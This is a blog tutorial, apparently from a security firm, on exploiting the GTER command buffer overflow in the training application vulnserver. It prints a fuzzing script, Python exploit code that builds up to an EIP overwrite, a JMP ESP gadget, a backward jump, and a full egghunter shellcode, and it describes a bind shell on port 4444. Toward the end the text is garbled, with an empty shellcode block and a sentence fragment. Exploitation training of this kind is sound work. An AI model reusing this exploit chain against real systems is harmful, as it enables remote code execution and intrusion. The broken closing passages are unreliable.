As we saw in the [previous post](../vulnserver-trun/), vulnserver is a
`VbD` (Vulnerable-by-Design) application designed to help you sharpen
the Windows exploitation skills.

Our [previous post](../vulnserver-trun/) described the exploitation of
`TRUN` command using a simple `EIP` overwrite technique, as we had
virtually no constraints for our payload. However, exploiting the `GTER`
command will not be as straightforward.

## Enumerating Vulnserver

If you launch `vulnserver.exe` with no options, the default port used
will be **TCP/9999**.

<div class="imgblock">

</div>

We can check the behavior of the `GTER` command by issuing the suggested
syntax.

<div class="imgblock">

![GTER command syntax](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gter/gter1_bow4kj.webp)

</div>

Ok, it’s fuzz time.

## Fuzzing GTER

As we did before with the `TRUN` command, we discovered the syntax
needed for the `GTER` command. And again, we’ll be using
[Spike](https://github.com/guilhermeferreira/spikepp) to help us with
our fuzzing.

As `GTER` uses a similar syntax to the `TRUN` command, we can reuse the
Spike script created in our previous post and just change the command.

**gter.spk.**

``` c
s_string("GTER ");
s_string_variable("*");
```

Remember that the `s_string` command will send an immutable string to
the fuzzed protocol, and `s_string_variable` tells `Spike` to use that
string as a fuzz point.

Now we can send the fuzz attack to the victim machine:

<div class="imgblock">

![Running spike](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331146/blog/vulnserver-gter/fuzz1_eahyra.gif)

</div>

Ugh\! After a few iterations, `vulnserver.exe` crashed, and it seems
that it happened when we sent 5060 bytes of data. Let’s check the
offending payload on `Wireshark`:

<div class="imgblock">

![Wireshark capture](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/wireshark1_ohyi15.webp)

</div>

We can now create a `PoC` (Proof-of-Concept) file with that information:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.29'
PORT = 9999

PAYLOAD = (
    b'GTER /.:/' +
    b'A' * 5060
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

This time, we’ll attach `vulnserver.exe` to Immunity Debugger.

Let’s run the initial exploit and see what happens:

<div class="imgblock">

![Exploit: take 1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331144/blog/vulnserver-gter/gter2_axxim1.gif)

</div>

Look at that\! We replicated the crash\!

<div class="imgblock">

![Controlling EIP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331146/blog/vulnserver-gter/crash1_tnurkm.webp)

</div>

Look at the state of the application at the moment of the crash. The
first thing to notice is that the `EIP` register has the value
`41414141`, which means that we effectively overwrote it with our buffer
of `A`. That’s good news. However, if you see in the stack window
(bottom right), we only have 20 bytes after the `ESP` pointer, so if we
do a `JMP ESP`, we will only have 20 bytes for working. That’s not
enough space for anything complex.

However, if we look at the dump window (bottom left), we have a broader
space (around 0x90 or 144 bytes) at the beginning of our buffer, which
is again not enough for something like a reverse shell, so, we need to
be creative here. Actually, we can fit a reverse shell in that space,
but we need to carve it manually by reusing already loaded `WinSock`
modules of `vulnserver`, but that technique is described in
[post](../vulnserver-gter-no-egghunter/).

First things first:

We need to calculate the exact offset on which `EIP` gets overwritten.
To do that, we will use `pattern_create.rb` from `Metasploit` to create
a cyclic pattern.

**Running pattern\_create.rb.**

``` console
# This will only work on Kali Linux
$ msf-pattern_create -l 400
```

<div class="imgblock">

![Cyclic pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/pattern1_rxyoot.webp)

</div>

We need now to update the exploit with that pattern:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.29'
PORT = 9999

PAYLOAD = (
    b'GTER /.:/' +
    b'<paste pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

And we run the exploit again:

<div class="imgblock">

![Exploit: take 2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/offset1_uk8di2.webp)

</div>

This time, `EIP` has the value `41396541`. Let’s check the offset on our
cyclic pattern:

**Running pattern\_offset.rb.**

``` console
# This will only work on Kali Linux
$ msf-pattern_offset -q 41396541
[*] Exact match at offset 147
```

Great, that tells us that the `EIP` gets overwritten starting on the
**147** byte of our buffer. Update the exploit to check the offset:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.29'
PORT = 9999

PAYLOAD = (
    b'GTER /.:/' +
    b'A' * 147 +
    b'B' * 4 +
    b'C' * (400 - 147 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

Now run the exploit. If `EIP` gets the value `42424242`, which are the
four bytes of our `B` buffer, we got it right:

<div class="imgblock">

![Correct offset to EIP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/offset2_bv13e7.webp)

</div>

Whoohooo\! Now we can start exploiting this.

## Exploiting

If we check the state of the application after the crash, we can see
that we can jump to `ESP` to gain control of the execution flow.

We can use `mona.py` plugin to find that instruction:

**mona looking for JMP ESP.**

``` console
! mona jmp -r esp -o -cp nonull
```

This will tell `mona` to look for the instruction `JMP ESP` and will
exclude `DLL` from the `OS`.

<div class="imgblock">

![JMP ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/mona1_ooj8ce.webp)

</div>

We will pick the `JMP ESP` instruction at `625011C7`. Now we can proceed
to update the exploit and replace the four `B` with that address:

**exploit.py.**

``` python
import socket
import struct

HOST = '192.168.0.29'
PORT = 9999

PAYLOAD = (
    b'GTER /.:/' +
    b'A' * 147 +
    # 625011C7 | FFE4 | jmp esp
    struct.pack('<L', 0x625011C7) +
    b'C' * (400 - 147 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

Let’s verify this:

<div class="imgblock">

![Performing the JMP ESP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/jmp1_ceeuzf.gif)

</div>

Great\!

But since everything can’t be so glorious, we landed on our `C` buffer,
which contains 20 bytes. We need to move to the `A` buffer, which holds
around 144 bytes to work.

## Jump around

To get around this space constraint, we need to jump to our bigger
buffer.

<div>
<cta-banner
buttontxt="Read more"
link="/solutions/penetration-testing/"
title="Get started with Fluid Attacks' Penetration Testing solution
right now"
/>
</div>

For jumping, we can use the unconditional jump instruction found in X86
architecture called `JMP` that will divert the execution flow to the
desired address. We also need to know where to jump.

Now look at the next image, which is the resulting location after our
`JMP ESP` execution:

<div class="imgblock">

![Location of our execution flow](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331145/blog/vulnserver-gter/jmp1_vnn3ms.webp)

</div>

As we can see, we are in the next instruction after the `JMP ESP` at the
address `00CBF9C8` (this is a stack address, so it will change every
time we run the application), and we see that we have only 20 bytes to
work.

If we scroll up, we can see that the buffer of `A` starts at `00CBF931`:

<div class="imgblock">

![Start of buffer](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331146/blog/vulnserver-gter/jmp2_yj95iy.webp)

</div>

So we need to do a relative reverse jump. Using the debugger, we can
easily calculate the offset:

<div class="imgblock">

![Relative backward jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331144/blog/vulnserver-gter/jmp3_gyybou.gif)

</div>

As you can see, the resulting bytes are `E9 64 FF FF FF`. Let’s update
our exploit with that jump:

**exploit.py.**

``` python
import socket
import struct

HOST = '192.168.0.29'
PORT = 9999

PAYLOAD = (
    b'GTER /.:/' +
    b'A' * 147 +
    # 625011C7 | FFE4 | jmp esp
    struct.pack('<L', 0x625011C7) +
    # JMP to the start of our buffer
    b'\xe9\x64\xff\xff\xff' +
    b'C' * (400 - 147 - 4 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

And check the result:

<div class="imgblock">

![Jumped back](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331144/blog/vulnserver-gter/jmp4_ebtqur.gif)

</div>

Great\! We were able to jump to the start of our buffer. But what now?
On 147 bytes, it’s hard to include a working reverse shell. However,
there’s a trick we can use that will have to do with eggs.

## Egghunter

An `egghunter` is a little shellcode (commonly around 32 bytes) that can
be injected on our payload. It’s a special shellcode because its only
mission is to search the entire process memory for the location of the
desired code, and once it finds it, it will execute it.

But how will it know what to execute? Well, it will look for a tag that
will be prepended to our shellcode, also called the `egg`, and once it
finds that `egg`, it will execute any code that follows.

First, we need to create our egghunter shellcode:

**Creating egghunter.**

``` console
$ msf-egghunter -e w00t -f python -v EGGHUNTER
EGGHUNTER =  b""
EGGHUNTER += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
```

Note that the configured egg is `w00t`. However, to make the searching
more effective, that egghunter was designed to look for a double
instance of that egg, which means `w00tw00t`. This will guarantee that
the executed code is the one we injected and will avoid false positives.

Let’s update our exploit:

**exploit.py.**

``` python
import socket
import struct

HOST = '192.168.0.29'
PORT = 9999

EGGHUNTER =  b""
EGGHUNTER += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

PAYLOAD = (
    b'GTER /.:/' +
    EGGHUNTER +
    b'A' * (147 - len(EGGHUNTER)) +
    # 625011C7 | FFE4 | jmp esp
    struct.pack('<L', 0x625011C7) +
    # JMP to the start of our buffer
    b'\xe9\x64\xff\xff\xff' +
    b'C' * (400 - 147 - 4 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
```

What will happen is the following:

1. Our buffer will be injected.

2. The `JMP ESP` will be executed.

3. The reverse jump will be executed and land directly to our
    egghunter.

4. The egghunter will iterate through all the memory looking for the
    egg `w00tw00t`.

5. When the egghunter finds the egg, it will execute anything that
    follows, in our case, a bind shellcode.

So, the only thing that’s missing is our shellcode. We will create one
that will bind a shell on port `4444`:

**Creating shellcode.**

```

But where can we fit it? This shellcode is 355 bytes long, but we only
have 140 bytes as much to work.

We have to think out of the box: `Vulnserver` is a server (really\!),
and it will surely multiplex connections. Well, we can create a
different connection to send the shellcode over\! That will store the
shellcode on the process memory where our egghunter will be able to find
it.

We can now finish our exploit. Remember to prepend the `w00tw00t` egg to
the shellcode, or the egghunter won’t be able to find it\!

Now, let’s look the egghunter in action:

correct tag because it will start using all the available CPU for
searching the egg on the entire system memory.
